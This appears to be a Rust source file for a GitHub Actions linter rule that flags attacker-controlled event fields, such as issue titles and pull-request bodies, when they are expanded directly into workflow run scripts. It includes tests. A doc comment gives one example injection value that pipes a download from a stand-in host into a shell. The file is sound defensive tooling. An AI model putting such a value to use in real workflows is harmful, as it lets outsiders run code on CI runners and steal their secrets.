use gh_actions_expr::{Expr, Reference};

use crate::rules::templated;
use crate::{Diagnostic, Rule, RuleInput};

/// What anyone who can open an issue or a pull request decides the value of. Expanded into a
/// script, the value is the script: a title of `"; curl evil.sh | sh; #` runs.
const CONTROLLED: [&[&str]; 18] = [
    &["event", "issue", "title"],
    &["event", "issue", "body"],
    &["event", "comment", "body"],
    &["event", "review", "body"],
    &["event", "review_comment", "body"],
    &["event", "discussion", "title"],
    &["event", "discussion", "body"],
    &["event", "pull_request", "title"],
    &["event", "pull_request", "body"],
    &["event", "pull_request", "head", "ref"],
    &["event", "pull_request", "head", "label"],
    &["event", "pull_request", "head", "repo", "description"],
    &["event", "pull_request", "head", "repo", "homepage"],
    &["event", "head_commit", "message"],
    &["event", "head_commit", "author", "name"],
    &["event", "head_commit", "author", "email"],
    &["event", "commits"],
    &["head_ref"],
];

/// Checks that nothing anyone can write reaches a script by being expanded into it. The
/// expansion happens before the shell sees the line, so quoting cannot save it.
pub struct TemplateInjection;

impl Rule for TemplateInjection {
    fn name(&self) -> &'static str {
        "template-injection"
    }

    fn check(&self, input: &RuleInput) -> Vec<Diagnostic> {
        let workflow = input.workflow;
        let mut findings = Vec::new();

        for (location, parsed) in templated(workflow) {
            if !location.ends_with(".run") {
                continue;
            }

            for reference in parsed.iter().flat_map(Expr::references) {
                let Some(said) = controlled(&reference) else {
                    continue;
                };

                findings.push(Diagnostic::warning(
                    self.name(),
                    location.clone(),
                    format!(
                        "`{said}` is written by whoever opened this, and is expanded into the \
                         script before the shell reads it; put it in `env:` and read it as a \
                         variable instead"
                    ),
                ));
            }
        }

        findings
    }
}

fn controlled(reference: &Reference) -> Option<String> {
    if reference.context != "github" {
        return None;
    }

    let read = reference.named();
    let matches = CONTROLLED.iter().any(|controlled| {
        read.len() >= controlled.len() && read[..controlled.len()] == **controlled
    });

    matches.then(|| format!("github.{}", read.join(".")))
}

#[cfg(test)]
mod tests {
    use super::TemplateInjection;
    use crate::tests::findings_of;

    #[test]
    fn a_title_expanded_into_a_script_is_reported() {
        let findings = findings_of(
            &TemplateInjection,
            r"
name: Build
on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo ${{ github.event.pull_request.title }}
",
        );

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule, "template-injection");
        assert_eq!(findings[0].location, "jobs.build.steps[0].run");
    }

    #[test]
    fn the_same_value_read_as_a_variable_is_fine() {
        let findings = findings_of(
            &TemplateInjection,
            r#"
name: Build
on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "$TITLE"
        env:
          TITLE: ${{ github.event.pull_request.title }}
"#,
        );

        assert!(findings.is_empty());
    }

    #[test]
    fn what_the_service_decides_is_left_alone() {
        let findings = findings_of(
            &TemplateInjection,
            r"
name: Build
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo ${{ github.sha }} ${{ github.run_id }}
",
        );

        assert!(findings.is_empty());
    }
}
